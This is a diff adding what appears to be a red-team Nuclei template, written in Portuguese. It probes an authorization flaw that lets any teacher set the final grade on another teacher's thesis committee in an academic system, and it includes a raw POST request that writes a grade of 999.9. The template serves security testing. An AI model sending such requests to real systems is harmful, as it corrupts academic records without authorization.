@@ -1,0 +1,20 @@
+id: rt02-tamper-nota-banca-alheia
+info:
+  name: "TEACHER sem vinculo altera notaFinal de banca de outro (banca 2 do teacher2) - setBancaGrade sem ownership"
+  author: redteam-sisdef
+  severity: high
+  description: "POST /banca/:bancaId/notas tem so checkRole; qualquer professor grava nota final em qualquer banca, inclusive de colegas."
+  tags: redteam,authz,integrity
+http:
+  - raw:
+      - |
+        POST /banca/2/notas HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{TOKEN_TEACHER}}
+        Content-Type: application/json
+
+        {"notaFinal":"999.9"}
+    matchers:
+      - type: status
+        status:
+          - 200
